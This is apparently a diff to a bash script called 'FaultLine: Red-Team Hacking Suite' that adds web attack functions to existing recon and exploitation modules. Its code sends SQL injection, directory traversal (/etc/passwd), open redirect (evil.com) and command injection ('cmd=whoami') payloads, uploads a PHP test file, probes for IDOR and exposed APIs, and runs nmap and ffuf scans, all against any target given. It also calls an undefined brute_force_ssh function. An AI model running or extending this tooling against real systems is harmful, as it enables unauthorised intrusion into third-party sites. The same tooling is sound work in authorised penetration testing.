@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# FaultLine: Red-Team Hacking Suite - Version 4.2
+# FaultLine: Red-Team Hacking Suite - Version 1.0
 # A comprehensive and advanced framework for recon, vulnerability discovery, and exploitation.
 
 # ======= COLORS =======
@@ -14,6 +14,7 @@ NC="\033[0m" # No Color
 SAVE_MODE=0
 OUTPUT_DIR=""
 DEBUG=1 # Set to 0 to disable debugging
+
 
 debug() {
     if [[ "$DEBUG" -eq 1 ]]; then
@@ -72,6 +73,7 @@ save_output() {
     fi
 }
 
+
 crawl_html() {
     echo -e "${CYAN}[+] Crawling HTML for sensitive data: $TARGET${NC}"
     curl -s "$TARGET" | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u > "$OUTPUT_DIR/urls.txt"
@@ -79,40 +81,37 @@ crawl_html() {
     echo -e "${GREEN}[+] Crawling results saved to $OUTPUT_DIR/urls.txt and $OUTPUT_DIR/comments.txt${NC}"
 }
 
+
 # ======= RECONNAISSANCE =======
 recon_module() {
     local domain="$1"
     echo -e "${CYAN}[+] Starting Reconnaissance on $domain...${NC}"
 
-   
     # Subdomain Enumeration
     echo "[*] Enumerating subdomains..."
     subdomains=$(subfinder -d "$domain" && dmitry -i -w -n -s -e -p "$domain" | sort -u)
     echo -e "${GREEN}[+] Subdomains:${NC}\n$subdomains"
     save_output "$subdomains" "subdomains_$domain.txt"
 
-    
     # FinalRecon Integration
     echo "[*] Running FinalRecon..."
     finalrecon_results=$(finalrecon --url "https://$domain" -w /grep/home/fuzz.txt)
     echo -e "${GREEN}[+] FinalRecon Results:${NC}\n$finalrecon_results"
     save_output "$finalrecon_results" "finalrecon_$domain.txt"
 
-   
     # Port Scanning
     echo "[*] Scanning ports..."
     nmap_results=$(nmap -sV -O -p- -T4 "$domain")
     echo -e "${GREEN}[+] Nmap Results:${NC}\n$nmap_results"
     save_output "$nmap_results" "nmap_$domain.txt"
 
-   
     # Directory Enumeration
     echo "[*] Fuzzing directories..."
     directories=$(ffuf -w "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" -u "$domain/FUZZ")
     echo -e "${GREEN}[+] Directories:${NC}\n$directories"
     save_output "$directories" "directories_$domain.txt"
-    
-    }
+
+}
 
 parse_js_files() {
     echo -e "${CYAN}[+] Extracting JavaScript endpoints.${NC}"
@@ -142,6 +141,7 @@ vulnerability_module() {
     xss_results=$(curl -s "$domain" | grep -o '<script>.*</script>')
     echo -e "${GREEN}[+] XSS Results:${NC}\n$xss_results"
     save_output "$xss_results" "xss_$domain.txt"
+
 }
 
 vulns_deep_crawl() {
@@ -184,8 +184,75 @@ ssrf_check() {
     done < "$OUTPUT_DIR/subdomains_$domain.txt"
 }
 
+find_hidden_inputs() {
+    echo -e "${CYAN}[+] Searching for hidden input fields...${NC}"
+    response=$(curl -s "$TARGET")
+    hidden_fields=$(echo "$response" | grep -i "type=\"hidden\"")
+    if [[ -n $hidden_fields ]]; then
+        echo -e "${GREEN}[+] Found hidden input fields:${NC}"
+        echo "$hidden_fields"
+    else
+        echo -e "${YELLOW}[-] No hidden input fields found.${NC}"
+    fi
+}
 
-# Manual SQL Injection Testing
+# IDOR Testing
+test_idor() {
+    echo -e "${CYAN}[+] Testing for IDOR Vulnerabilities...${NC}"
+    id_list=(1 2 3 4 5)
+    for id in "${id_list[@]}"; do
+        response=$(curl -s "$TARGET/profile?id=$id")
+        if [[ $response == *"Profile ID: $id"* ]]; then
+            echo -e "${GREEN}[+] Possible IDOR found with ID: $id${NC}"
+        else
+            echo -e "${YELLOW}[-] No IDOR with ID: $id${NC}"
+        fi
+    done
+}
+
+# WAF Detection
+detect_waf() {
+    echo -e "${CYAN}[+] Detecting WAF...${NC}"
+    payload="' AND 1=1 --"
+    response=$(curl -s -d "param=$payload" "$TARGET" -o /dev/null -w "%{http_code}")
+    if [[ $response == "403" || $response == "406" ]]; then
+        echo -e "${RED}[!] WAF detected: Response code $response.${NC}"
+    else
+        echo -e "${GREEN}[+] No WAF detected.${NC}"
+    fi
+}
+
+# Directory Traversal Testing
+test_directory_traversal() {
+    echo -e "${CYAN}[+] Testing for Directory Traversal...${NC}"
+    payloads=("../../../../etc/passwd" "../../../windows/system32/drivers/etc/hosts")
+    for payload in "${payloads[@]}"; do
+        response=$(curl -s "$TARGET/$payload")
+        if [[ $response == *"root:x"* || $response == *"127.0.0.1"* ]]; then
+            echo -e "${RED}[!] Directory traversal vulnerability found! Payload: $payload${NC}"
+        else
+            echo -e "${YELLOW}[-] No directory traversal with payload: $payload${NC}"
+        fi
+    done
+}
+
+# CMS Detection
+detect_cms() {
+    echo -e "${CYAN}[+] Detecting CMS...${NC}"
+    response=$(curl -s "$TARGET")
+    if echo "$response" | grep -iq "wp-content"; then
+        echo -e "${GREEN}[+] WordPress detected.${NC}"
+    elif echo "$response" | grep -iq "drupal"; then
+        echo -e "${GREEN}[+] Drupal detected.${NC}"
+    elif echo "$response" | grep -iq "joomla"; then
+        echo -e "${GREEN}[+] Joomla detected.${NC}"
+    else
+        echo -e "${YELLOW}[-] No CMS detected.${NC}"
+    fi
+}
+
+
+# SQL Injection Testing
 sql_injection_test() {
     echo -e "${CYAN}[+] Testing SQL injection vulnerabilities on: $TARGET${NC}"
     PAYLOADS=("' OR '1'='1" "' AND SLEEP(5)--")
@@ -193,6 +260,62 @@ sql_injection_test() {
         RESPONSE=$(curl -s "$TARGET?id=$PAYLOAD")
         if [[ $RESPONSE =~ "error" || $RESPONSE =~ "syntax" ]]; then
             echo -e "${GREEN}[!] SQL Injection vulnerability detected with payload: $PAYLOAD${NC}"
+        fi
+    done
+}
+
+test_open_redirect() {
+    echo -e "${CYAN}[+] Testing for Open Redirect Vulnerabilities...${NC}"
+    payloads=("https://evil.com" "javascript:alert(1)" "//evil.com")
+    for payload in "${payloads[@]}"; do
+        response=$(curl -s -L "$TARGET/redirect?url=$payload")
+        if [[ $response == *"evil.com"* || $response == *"alert(1)"* ]]; then
+            echo -e "${RED}[!] Open Redirect found with payload: $payload${NC}"
+        else
+            echo -e "${YELLOW}[-] No open redirect with payload: $payload${NC}"
+        fi
+    done
+}
+
+test_http_methods() {
+    echo -e "${CYAN}[+] Testing HTTP Methods...${NC}"
+    methods=("GET" "POST" "PUT" "DELETE" "OPTIONS" "HEAD" "TRACE")
+    for method in "${methods[@]}"; do
+        response=$(curl -s -X "$method" "$TARGET" -w "%{http_code}")
+        echo -e "${YELLOW}[*] $method returned status code: $response${NC}"
+        if [[ $method == "TRACE" && $response == "200" ]]; then
+            echo -e "${RED}[!] TRACE method enabled. Possible XST vulnerability!${NC}"
+        fi
+    done
+}
+
+test_file_upload() {
+    echo -e "${CYAN}[+] Testing for File Upload Vulnerabilities...${NC}"
+    payload_file="test_payload.php"
+    echo "<?php echo 'Vulnerable'; ?>" > $payload_file
+
+    upload_endpoints=("$TARGET/upload" "$TARGET/file-upload" "$TARGET/api/upload")
+    for endpoint in "${upload_endpoints[@]}"; do
+        response=$(curl -s -F "file=@$payload_file" "$endpoint")
+        if [[ $response == *"Vulnerable"* ]]; then
+            echo -e "${RED}[!] File upload successful at $endpoint${NC}"
+            echo -e "${YELLOW}[!] Check for execution: $endpoint/test_payload.php${NC}"
+        else
+            echo -e "${YELLOW}[-] File upload failed at $endpoint${NC}"
+        fi
+    done
+    rm $payload_file
+}
+
+exploit_unauth_api() {
+    echo -e "${CYAN}[+] Checking for unauthenticated API access...${NC}"
+    endpoints=("users" "admin" "config")
+    for endpoint in "${endpoints[@]}"; do
+        response=$(curl -s "$TARGET/api/$endpoint")
+        if [[ -n $response ]]; then
+            echo -e "${RED}[!] Found exposed API endpoint: $endpoint${NC}"
+        else
+            echo -e "${YELLOW}[-] No data found at /api/$endpoint.${NC}"
         fi
     done
 }
@@ -207,6 +330,7 @@ exploit_module() {
     cmd_injection_results=$(curl -s -X POST -d "cmd=whoami" "$domain" | grep -i "root")
     echo -e "${GREEN}[+] Command Injection Results:${NC}\n$cmd_injection_results"
     save_output "$cmd_injection_results" "cmd_injection_$domain.txt"
+
 }
 
 Exploit_Known_CVEs() {
@@ -232,11 +356,20 @@ main() {
             vulns_deep_crawl "$TARGET"
             parse_js_files "$TARGET"
             ssrf_check "$TARGET"
+            detect_cms "$TARGET" 
+            test_idor "$TARGET"
+            test_directory_traversal "$TARGET"
+            detect_waf "$TARGET"
+            test_http_methods "$TARGET"
+            exploit_unauth_api "$TARGET"
             ;;
         exploit)
             exploit_module "$TARGET"
             sql_injection_test "$TARGET"
             vulns_deep_crawl "$TARGET"
+            brute_force_ssh "$TARGET"
+            test_open_redirect "$TARGET"
+            test_file_upload "$TARGET"
             ;;
         all)
             recon_module "$TARGET"
@@ -249,6 +382,16 @@ main() {
             vulnerability_module "$TARGET"
             exploit_module "$TARGET"
             ssrf_check "$TARGET"
+            detect_cms "$TARGET"
+            test_idor "$TARGET"
+            test_directory_traversal "$TARGET"
+            detect_waf "$TARGET"
+            Exploit_Known_CVEs "$TARGET"
+            find_hidden_inputs "$TARGET"
+            test_open_redirect "$TARGET"
+            test_http_methods "$TARGET"
+            test_file_upload "$TARGET"
+            exploit_unauth_api "$TARGET"
             ;;
         *)
             echo -e "${RED}[!] Invalid mode. Use recon, exploit, or all.${NC}"
